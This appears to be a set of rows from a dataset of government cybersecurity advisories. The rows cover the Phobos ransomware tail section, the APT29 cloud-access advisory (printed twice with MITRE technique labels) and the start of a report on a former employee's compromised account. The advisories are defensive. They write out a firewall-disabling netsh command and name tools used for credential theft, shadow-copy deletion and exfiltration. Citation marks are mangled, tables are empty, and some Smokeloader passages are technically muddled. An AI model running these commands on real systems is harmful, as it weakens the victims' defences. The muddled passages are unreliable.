Phobos operations feature a standard three phase process to decrypt a payload that allows the threat actors to deploy additional destructive malware.,9,
For the first phase, Smokeloader manipulates either VirtualAlloc or VirtualProtect API functions—which opens an entry point, enabling code to be injected into running processes and allowing the malware to evade network defense tools,. In the second phase, a stealth process is used to obfuscate command and control (C2) activity by producing requests to legitimate websites,.,10,
Within this phase, the shellcode also sends a call from the entry point to a memory container, and prepares a portable executable for deployment in the final stage,.
Finally, once Smokeloader reaches its third stage, it unpacks a program-erase cycle from stored memory, which is then sent to be extracted from a SHA 256 hash as a payload.,7, Following successful payload decryption, the threat actors can begin downloading additional malware.
Additional Phobos Defense Evasion Capabilities
Phobos ransomware actors have been observed bypassing organizational network defense protocols by modifying system firewall configurations using commands like netsh firewall set opmode mode=disable,. Additionally, Phobos actors can evade detection by using the following tools: Universal Virus Sniffer, Process Hacker, and PowerTool,.
Persistence and Privilege Escalation
According to open source reporting, Phobos ransomware uses commands such as Exec.exe or the bcdedit,.,exe control mechanism. Phobos has also been observed using Windows Startup folders and Run Registry Keys such as C:/Users\Admin\AppData\Local\directory, to maintain persistence within compromised environments.,5,
Additionally, Phobos actors have been observed using built-in Windows API functions, to steal tokens, bypass access controls, and create new processes to escalate privileges by leveraging the SeDebugPrivilege process,. Phobos actors attempt to authenticate using cached password hashes on victim machines until they reach domain administrator access,.
Discovery and Credential Access
Phobos actors additionally use open source tools, such as Bloodhound and Sharphound to enumerate the active directory,. Mimikatz and NirSoft, as well as Remote Desktop Passview to export browser client credentials, have also been used. Furthermore, Phobos ransomware is able to enumerate connected storage devices, running processes, and encrypt user files,.
Exfiltration
Phobos actors have been observed using WinSCP and Mega.io for file exfiltration.,11, They use WinSCP to connect directly from a victim network to an FTP server, they control,. Phobos actors install Mega.io, and use it to export victim files directly to a cloud storage provider,. Data is typically archived as either a .rar or .zip file, to be later exfiltrated. They target legal documentation, financial records, technical documents (including network architecture), and databases for commonly used password management software,.
Impact
After the exfiltration phase, Phobos actors then hunt for backups. They use vssadmin.exe and Windows Management Instrumentation command-line utility (WMIC) to discover and delete volume shadow copies in Windows environments. This prevents victims from recovering files after encryption has taken place,.
Phobos.exe contains functionality to encrypt all connected logical drives on the target host,. Each Phobos ransomware executable has unique build identifiers (IDs), affiliate IDs, as well as a unique ransom note which is embedded in the executable. After the ransom note has populated on infected workstations, Phobos ransomware continues to search for and encrypt additional files.
Most extortion, occurs via email; however, some affiliate groups have used voice calls to contact victims. In some cases, Phobos actors have used onion sites to list victims and host stolen victim data. Phobos actors use various instant messaging applications such as ICQ, Jabber, and QQ to communicate,. See Figure 2 for a list of email providers used by the following Phobos affiliates: Devos, Eight, Elbie, Eking, and Faust.,6,

 

Figure 1: Phobos Affiliate Providers List

INDICATORS OF COMPROMISE (IOCs)
See Table 1 through 6 for IOCs obtained from CISA and the FBI investigations from September through November 2023.


The commands above are observed during the execution of a Phobos encryption executable. A Phobos encryption executable spawns a cmd.exe process, which then executes the commands listed in Table 1 with their respective Windows system executables. When the commands above are executed on a Windows system, volume shadow copies are deleted and Windows Firewall is disabled. Additionally, the system’s boot status policy is set to boot even when there are errors during the boot process, and automatic recovery options, like Windows Recovery Environment (WinRE), are disabled for the given boot entry. The system’s backup catalog is also deleted. Finally, the Phobos ransom note is displayed to the end user using mshta.exe.




Disclaimer: Organizations are encouraged to investigate the use of the IOCs in Table 7 for related signs of compromise prior to performing remediation actions.

Disclaimer: Organizations are encouraged to investigate the use of the file hashes in Tables 8 and 9 for related signs of compromise prior to performing remediation actions.


MITRE ATT&CK TECHNIQUES
See Table 10 through 22 for all threat actor tactics and techniques referenced in this advisory.













MITIGATIONS
Secure by Design and Default Mitigations:
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and MS-ISAC recommend that software manufacturers incorporate secure by design and default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The FBI, CISA, and MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture against actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Secure remote access software by applying recommendations from the joint Guide to Securing Remote Access Software.
Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlist solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Implement log collection best practices and use intrusion detection systems to defend against threat actors manipulating firewall configurations through early detection,CPG 2.T,.

Implement EDR solutions to disrupt threat actor memory allocation techniques.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 4.C,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP),CPG 2.E,.
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts at the admin level and higher,CPG 2.A, 2.E,.

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices,CPG 2.R,.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters and no more than 64 characters in length,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems,CPG 2.H,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA, NSA, FBI, and Multi-State Information Sharing and Analysis Center’s (MS-ISAC) Joint #StopRansomware Guide.
SLTT organizations are encouraged to implement MS-ISAC’s Ransomware Defense-in-Depth guidance.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REFERENCES,1, Privacy Affairs: “Moral” 8Base Ransomware Targets 2 New Victims,2, VMware: 8base ransomware: A Heavy Hitting Player,3, Infosecurity Magazine: Phobos Ransomware Family Expands With New FAUST Variant,4, The Record: Hospitals offline across Romania following ransomware attack on IT platform,5, Comparitech: What is Phobos Ransomware & How to Protect Against It?,6, Cisco Talos: Understanding the Phobos affiliate structure and activity,7, Cisco Talos: A deep dive into Phobos ransomware, recently deployed by 8Base group,8, Malwarebytes Labs: A deep dive into Phobos ransomware,9, Any Run: Smokeloader,10, Malpedia: Smokeloader,11, Truesec: A case of the FAUST Ransomware,12, VirusTotal: Phobos Domain #1,13, VirusTotal: Phobos executable: Ahpdate.exe,14, VirusTotal: Phobos GUI extension: ELF File,15, VirusTotal: Phobos IP address: 185.202.0,.,111,16, VirusTotal: Phobos GUI extension: Binary File,17, Cisco Talos GitHub: IOCs/2023/11/deep-dive-into-phobos-ransomware.txt at main
REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom-note, communications with Phobos actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
DISCLAIMER
The FBI does not conduct its investigative activities or base attribution solely on activities protected by the First Amendment. Your company has no obligation to respond or provide information back to the FBI in response to this engagement. If, after reviewing the information, your company decides to provide referral information to the FBI, it must do so in a manner consistent with federal law. The FBI does not request or expect your company to take any particular action regarding this information other than holding it in confidence due to its sensitive nature.
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, and the MS-ISAC.
ACKNOWLEDGEMENTS
The California Joint Regional Intelligence Center (JRIC, CA) and Israel National Cyber Directorate (INCD) contributed to this CSA.
VERSION HISTORY
February 29, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060a
1,"



How SVR-Attributed Actors are Adapting to the Move of Government and Corporations to Cloud Infrastructure
OVERVIEW
This advisory details recent tactics, techniques, and procedures (TTPs) of the group commonly known as APT29, also known as Midnight Blizzard, the Dukes, or Cozy Bear.
The UK National Cyber Security Centre (NCSC) and international partners assess that APT29 is a cyber espionage group, almost certainly part of the SVR, an element of the Russian intelligence services. The US National Security Agency (NSA), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Cyber National Mission Force (CNMF), the Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and New Zealand Government Communications Security Bureau (GCSB) agree with this attribution and the details provided in this advisory.
This advisory provides an overview of TTPs deployed by the actor to gain initial access into the cloud environment and includes advice to detect and mitigate this activity.
To download the PDF version of this report, click here.
PREVIOUS ACTOR ACTIVITY
The NCSC has previously detailed how Russian Foreign Intelligence Service (SVR) cyber actors have targeted governmental, think tank, healthcare, and energy targets for intelligence gain. It has now observed SVR actors expanding their targeting to include aviation, education, law enforcement, local and state councils, government financial departments, and military organizations.
SVR actors are also known for:

The supply chain compromise of SolarWinds software.
Activity that targeted organizations developing the COVID-19 vaccine.

EVOLVING TTPs
As organizations continue to modernize their systems and move to cloud-based infrastructure, the SVR has adapted to these changes in the operating environment.
They have to move beyond their traditional means of initial access, such as exploiting software vulnerabilities in an on-premises network, and instead target the cloud services themselves.
To access the majority of the victims’ cloud hosted network, actors must first successfully authenticate to the cloud provider. Denying initial access to the cloud environment can prohibit SVR from successfully compromising their target. In contrast, in an on-premises system, more of the network is typically exposed to threat actors.
Below describes in more detail how SVR actors are adapting to continue their cyber operations for intelligence gain. These TTPs have been observed in the last 12 months.
ACCESS VIA SERVICE AND DORMANT ACCOUNTS
Previous SVR campaigns reveal the actors have successfully used brute forcing [T1110] and password spraying to access service accounts. This type of account is typically used to run and manage applications and services. There is no human user behind them so they cannot be easily protected with multi-factor authentication (MFA), making these accounts more susceptible to a successful compromise. Service accounts are often also highly privileged depending on which applications and services they’re responsible for managing. Gaining access to these accounts provides threat actors with privileged initial access to a network, to launch further operations.
SVR campaigns have also targeted dormant accounts belonging to users who no longer work at a victim organization but whose accounts remain on the system [T1078.004].
Following an enforced password reset for all users during an incident, SVR actors have also been observed logging into inactive accounts and following instructions to reset the password. This has allowed the actor to regain access following incident response eviction activities.
CLOUD-BASED TOKEN AUTHENTICATION
Account access is typically authenticated by either username and password credentials or system-issued access tokens. The NCSC and partners have observed SVR actors using tokens to access their victims’ accounts, without needing a password [T1528].
The default validity time of system-issued tokens varies dependent on the system; however, cloud platforms should allow administrators to adjust the validity time as appropriate for their users. More information can be found on this in the mitigations section of this advisory.
ENROLLING NEW DEVICES TO THE CLOUD
On multiple occasions, the SVR have successfully bypassed password authentication on personal accounts using password spraying and credential reuse. SVR actors have also then bypassed MFA through a technique known as “MFA bombing” or “MFA fatigue,” in which the actors repeatedly push MFA requests to a victim’s device until the victim accepts the notification [T1621].
Once an actor has bypassed these systems to gain access to the cloud environment, SVR actors have been observed registering their own device as a new device on the cloud tenant [T1098.005]. If device validation rules are not set up, SVR actors can successfully register their own device and gain access to the network.
By configuring the network with device enrollment policies, there have been instances where these measures have defended against SVR actors and denied them access to the cloud tenant.
RESIDENTIAL PROXIES
As network-level defenses improve detection of suspicious activity, SVR actors have looked at other ways to stay covert on the internet. A TTP associated with this actor is the use of residential proxies [T1090.002]. Residential proxies typically make traffic appear to originate from IP addresses within internet service provider (ISP) ranges used for residential broadband customers and hide the true source. This can make it harder to distinguish malicious connections from typical users. This reduces the effectiveness of network defenses that use IP addresses as indicators of compromise, and so it is important to consider a variety of information sources such as application and host-based logging for detecting suspicious activity.
CONCLUSION
The SVR is a sophisticated actor capable of carrying out a global supply chain compromise such as the 2020 SolarWinds, however the guidance in this advisory shows that a strong baseline of cyber security fundamentals can help defend from such actors.
For organizations that have moved to cloud infrastructure, a first line of defense against an actor such as SVR should be to protect against SVR’s TTPs for initial access. By following the mitigations outlined in this advisory, organizations will be in a stronger position to defend against this threat.
Once the SVR gain initial access, the actor is capable of deploying highly sophisticated post compromise capabilities such as MagicWeb, as reported in 2022. Therefore, mitigating against the SVR’s initial access vectors is particularly important for network defenders.
CISA have also produced guidance through their Secure Cloud Business Applications (SCuBA) Project which is designed to protect assets stored in cloud environments.
Some of the TTPs listed in this report, such as residential proxies and exploitation of system accounts, are similar to those reported as recently as January 2024 by Microsoft.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.



Tactic
ID
Technique
Procedure




Credential Access
T1110
Brute Force
The SVR use password spraying and brute forcing as an initial infection vector.


Initial Access
T1078.004
Valid Accounts: Cloud Accounts
The SVR use compromised credentials to gain access to accounts for cloud services, including system and dormant accounts.


Credential Access
T1528
Steal Application Access Token
The SVR use stolen access tokens to login to accounts without the need for passwords.


Credential Access
T1621
Multi-Factor Authentication Request Generation
The SVR repeatedly push MFA requests to a victim’s device until the victim accepts the notification, providing SVR access to the account.


Command and Control
T1090.002
Proxy: External Proxy
The SVR use open proxies in residential IP ranges to blend in with expected IP address pools in access logs.


Persistence
T1098.005
Account Manipulation: Device Registration
The SVR attempt to register their own device on the cloud tenant after acquiring access to accounts.



MITIGATION AND DETECTION
A number of mitigations will be useful in defending against the activity described in this advisory: 

Use multi-factor authentication (/2-factor authentication/two-step verification) to reduce the impact of password compromises. See NCSC guidance: Multifactor Authentication for Online Services and Setting up 2-Step Verification (2SV).
Accounts that cannot use 2SV should have strong, unique passwords. User and system accounts should be disabled when no longer required with a “joiners, movers, and leavers” process in place and regular reviews to identify and disable inactive/dormant accounts. See NCSC guidance: 10 Steps to Cyber Security.
System and service accounts should implement the principle of least privilege, providing tightly scoped access to resources required for the service to function.
Canary service accounts should be created which appear to be valid service accounts but are never used by legitimate services. Monitoring and alerting on the use of these account provides a high confidence signal that they are being used illegitimately and should be investigated urgently.
Session lifetimes should be kept as short as practical to reduce the window of opportunity for an adversary to use stolen session tokens. This should be paired with a suitable authentication method that strikes a balance between regular user authentication and user experience.
Ensure device enrollment policies are configured to only permit authorized devices to enroll. Use zero-touch enrollment where possible, or if self-enrollment is required then use a strong form of 2SV that is resistant to phishing and prompt bombing. Old devices should be prevented from (re)enrolling when no longer required. See NCSC guidance: Device Security Guidance.
Consider a variety of information sources such as application events and host-based logs to help prevent, detect and investigate potential malicious behavior. Focus on the information sources and indicators of compromise that have a better rate of false positives. For example, looking for changes to user agent strings that could indicate session hijacking may be more effective than trying to identify connections from suspicious IP addresses. See NCSC guidance: Introduction to Logging for Security Purposes.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1621', 'T1090.002', 'T1110', 'T1078.004', 'T1098.005', 'T1528'}","



How SVR-Attributed Actors are Adapting to the Move of Government and Corporations to Cloud Infrastructure
OVERVIEW
This advisory details recent tactics, techniques, and procedures (TTPs) of the group commonly known as APT29, also known as Midnight Blizzard, the Dukes, or Cozy Bear.
The UK National Cyber Security Centre (NCSC) and international partners assess that APT29 is a cyber espionage group, almost certainly part of the SVR, an element of the Russian intelligence services. The US National Security Agency (NSA), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Cyber National Mission Force (CNMF), the Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and New Zealand Government Communications Security Bureau (GCSB) agree with this attribution and the details provided in this advisory.
This advisory provides an overview of TTPs deployed by the actor to gain initial access into the cloud environment and includes advice to detect and mitigate this activity.
To download the PDF version of this report, click here.
PREVIOUS ACTOR ACTIVITY
The NCSC has previously detailed how Russian Foreign Intelligence Service (SVR) cyber actors have targeted governmental, think tank, healthcare, and energy targets for intelligence gain. It has now observed SVR actors expanding their targeting to include aviation, education, law enforcement, local and state councils, government financial departments, and military organizations.
SVR actors are also known for:

The supply chain compromise of SolarWinds software.
Activity that targeted organizations developing the COVID-19 vaccine.

EVOLVING TTPs
As organizations continue to modernize their systems and move to cloud-based infrastructure, the SVR has adapted to these changes in the operating environment.
They have to move beyond their traditional means of initial access, such as exploiting software vulnerabilities in an on-premises network, and instead target the cloud services themselves.
To access the majority of the victims’ cloud hosted network, actors must first successfully authenticate to the cloud provider. Denying initial access to the cloud environment can prohibit SVR from successfully compromising their target. In contrast, in an on-premises system, more of the network is typically exposed to threat actors.
Below describes in more detail how SVR actors are adapting to continue their cyber operations for intelligence gain. These TTPs have been observed in the last 12 months.
ACCESS VIA SERVICE AND DORMANT ACCOUNTS
Previous SVR campaigns reveal the actors have successfully used brute forcing, and password spraying to access service accounts. This type of account is typically used to run and manage applications and services. There is no human user behind them so they cannot be easily protected with multi-factor authentication (MFA), making these accounts more susceptible to a successful compromise. Service accounts are often also highly privileged depending on which applications and services they’re responsible for managing. Gaining access to these accounts provides threat actors with privileged initial access to a network, to launch further operations.
SVR campaigns have also targeted dormant accounts belonging to users who no longer work at a victim organization but whose accounts remain on the system,.
Following an enforced password reset for all users during an incident, SVR actors have also been observed logging into inactive accounts and following instructions to reset the password. This has allowed the actor to regain access following incident response eviction activities.
CLOUD-BASED TOKEN AUTHENTICATION
Account access is typically authenticated by either username and password credentials or system-issued access tokens. The NCSC and partners have observed SVR actors using tokens to access their victims’ accounts, without needing a password,.
The default validity time of system-issued tokens varies dependent on the system; however, cloud platforms should allow administrators to adjust the validity time as appropriate for their users. More information can be found on this in the mitigations section of this advisory.
ENROLLING NEW DEVICES TO THE CLOUD
On multiple occasions, the SVR have successfully bypassed password authentication on personal accounts using password spraying and credential reuse. SVR actors have also then bypassed MFA through a technique known as “MFA bombing” or “MFA fatigue,” in which the actors repeatedly push MFA requests to a victim’s device until the victim accepts the notification,.
Once an actor has bypassed these systems to gain access to the cloud environment, SVR actors have been observed registering their own device as a new device on the cloud tenant,. If device validation rules are not set up, SVR actors can successfully register their own device and gain access to the network.
By configuring the network with device enrollment policies, there have been instances where these measures have defended against SVR actors and denied them access to the cloud tenant.
RESIDENTIAL PROXIES
As network-level defenses improve detection of suspicious activity, SVR actors have looked at other ways to stay covert on the internet. A TTP associated with this actor is the use of residential proxies,. Residential proxies typically make traffic appear to originate from IP addresses within internet service provider (ISP) ranges used for residential broadband customers and hide the true source. This can make it harder to distinguish malicious connections from typical users. This reduces the effectiveness of network defenses that use IP addresses as indicators of compromise, and so it is important to consider a variety of information sources such as application and host-based logging for detecting suspicious activity.
CONCLUSION
The SVR is a sophisticated actor capable of carrying out a global supply chain compromise such as the 2020 SolarWinds, however the guidance in this advisory shows that a strong baseline of cyber security fundamentals can help defend from such actors.
For organizations that have moved to cloud infrastructure, a first line of defense against an actor such as SVR should be to protect against SVR’s TTPs for initial access. By following the mitigations outlined in this advisory, organizations will be in a stronger position to defend against this threat.
Once the SVR gain initial access, the actor is capable of deploying highly sophisticated post compromise capabilities such as MagicWeb, as reported in 2022. Therefore, mitigating against the SVR’s initial access vectors is particularly important for network defenders.
CISA have also produced guidance through their Secure Cloud Business Applications (SCuBA) Project which is designed to protect assets stored in cloud environments.
Some of the TTPs listed in this report, such as residential proxies and exploitation of system accounts, are similar to those reported as recently as January 2024 by Microsoft.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

MITIGATION AND DETECTION
A number of mitigations will be useful in defending against the activity described in this advisory: 

Use multi-factor authentication (/2-factor authentication/two-step verification) to reduce the impact of password compromises. See NCSC guidance: Multifactor Authentication for Online Services and Setting up 2-Step Verification (2SV).
Accounts that cannot use 2SV should have strong, unique passwords. User and system accounts should be disabled when no longer required with a “joiners, movers, and leavers” process in place and regular reviews to identify and disable inactive/dormant accounts. See NCSC guidance: 10 Steps to Cyber Security.
System and service accounts should implement the principle of least privilege, providing tightly scoped access to resources required for the service to function.
Canary service accounts should be created which appear to be valid service accounts but are never used by legitimate services. Monitoring and alerting on the use of these account provides a high confidence signal that they are being used illegitimately and should be investigated urgently.
Session lifetimes should be kept as short as practical to reduce the window of opportunity for an adversary to use stolen session tokens. This should be paired with a suitable authentication method that strikes a balance between regular user authentication and user experience.
Ensure device enrollment policies are configured to only permit authorized devices to enroll. Use zero-touch enrollment where possible, or if self-enrollment is required then use a strong form of 2SV that is resistant to phishing and prompt bombing. Old devices should be prevented from (re)enrolling when no longer required. See NCSC guidance: Device Security Guidance.
Consider a variety of information sources such as application events and host-based logs to help prevent, detect and investigate potential malicious behavior. Focus on the information sources and indicators of compromise that have a better rate of false positives. For example, looking for changes to user agent strings that could indicate session hijacking may be more effective than trying to identify connections from suspicious IP addresses. See NCSC guidance: Introduction to Logging for Security Purposes.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-057a
2,"






Actions to take today to mitigate malicious cyber activity:




Continuously remove and disable accounts and groups from the enterprise that are no longer needed, especially privileged accounts.
Enable and enforce multifactor authentication with strong passwords.
Store credentials in a secure manner, such as with a credential manager, vault, or other privilege account management solution.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and the Multi-State Information Sharing & Analysis Center (MS-ISAC) conducted an incident response assessment of a state government organization’s network environment after documents containing host and user information, including metadata, were posted on a dark web brokerage site. Analysis confirmed that an unidentified threat actor compromised network administrator credentials through the account of a former employee—a technique commonly leveraged by threat actors—to successfully authenticate to an internal virtual private network (VPN) access point, further navigate the victim’s on-premises environment, and execute various lightweight directory access protocol (LDAP) queries against a domain controller.[1] Analysis also focused on the victim’s Azure environment, which hosts sensitive systems and data, as well as the compromised on-premises environment. Analysis determined there were no indications the threat actor further compromised the organization by moving laterally from the on-premises environment to the Azure environment.
CISA and MS-ISAC are releasing this Cybersecurity Advisory (CSA) to provide network defenders with the tactics, techniques, and procedures (TTPs) used by the threat actor and methods to protect against similar exploitation of both unnecessary and privileged accounts.
Download the PDF version of this report:


AA24-046A Threat Actor Leverages Compromised Account of Former Employee to Access State Government Organization
(PDF,       499.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actor’s activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
A state government organization was notified that documents containing host and user information, including metadata, were posted on a dark web brokerage site. After further investigation, the victim organization determined that the documents were accessed via the compromised account of a former employee. Threat actors commonly leverage valid accounts, including accounts of former employees that have not been properly removed from the Active Directory (AD), to gain access to organizations.[1] CISA and MS-ISAC assessed that an unidentified threat actor likely accessed documents containing host and user information to post on the dark web for profit after gaining access through the account of a former employee.
The scope of this investigation included the victim organization’s on-premises environment, as well as their Azure environment, which hosts sensitive systems and data. Analysis determined the threat actor did not move laterally from the compromised on-premises network to the Azure environment and did not compromise sensitive systems.
Untitled Goose Tool
Incident responders collected Azure and Microsoft Defender for Endpoint (MDE) logs using CISA’s Untitled Goose Tool—a free tool to help network defenders detect potentially malicious activity in Microsoft Azure, Azure Active Directory (AAD), and Microsoft 365 (M365) environments. CISA developed the Untitled Goose Tool to export and review AAD sign-in and audit logs, M365 unified audit logs (UAL), Azure activity logs, and MDE data. By exporting cloud artifacts, Untitled Goose Tool supports incident response teams with environments that do not ingest logs into a security information and event management (SIEM) tool.
Threat Actor Activity
The logs revealed the threat actor first connected from an unknown virtual machine (VM) to the victim’s on-premises environment via internet protocol (IP) addresses within their internal VPN range. CISA and MS-ISAC assessed that the threat actor connected to the VM through the victim’s VPN [T1133] with the intent to blend in with legitimate traffic to evade detection.
Initial Access: Compromised Domain Accounts
USER1: The threat actor gained initial access through the compromised account of a former employee with administrative privileges (USER1) [T1078.002] to conduct reconnaissance and discovery activities. The victim organization confirmed that this account was not disabled immediately following the employee’s departure.

The threat actor likely obtained the USER1 account credentials in a separate data breach due to the credentials appearing in publicly available channels containing leaked account information [T1589.001].
USER1 had access to two virtualized servers including SharePoint and the workstation of the former employee. The workstation was virtualized from a physical workstation using the Veeam Physical to Virtual (P2V) function within the backup software.

USER2: The threat actor likely obtained the USER2 account credentials from the virtualized SharePoint server managed by USER1 [T1213.002]. The victim confirmed that the administrator credentials for USER2 were stored locally on this server [T1552.001].

Through connection from the VM, the threat actor authenticated to multiple services [T1021] via the USER1 account, as well as from an additional compromised global domain administrator account (USER2) [T1078.002].
The threat actor’s use of the USER2 account was impactful due to the access it granted to both the on-premises AD and Azure AD [T1021.007], thus enabling administrative privileges [T1078.004].

Following notification of the dark web posting, the victim organization immediately disabled the USER1 account and took the two virtualized servers associated with the former employee offline. The victim also changed the password for the USER2 account and removed administrator privileges. Neither of the administrative accounts had multifactor authentication (MFA) enabled.
LDAP Queries
Through connection from the VM, the threat actor conducted LDAP queries of the AD, likely using the open source tool AdFind.exe, based on the format of the output. CISA and MS-ISAC assess the threat actor executed the LDAP queries [T1087.002] to collect user, host [T1018], and trust relationship information [T1482]. It is also believed the LDAP queries generated the text files the threat actor posted for sale on the dark web brokerage site: ad_users.txt, ad_computers.txt, and trustdmp.txt.
Table 1 lists all queries that were conducted between 08:39:43-08:40:56 Coordinated Universal Time (UTC).

Table 1: LDAP Queries Conducted by the Threat Actor


Query
Description




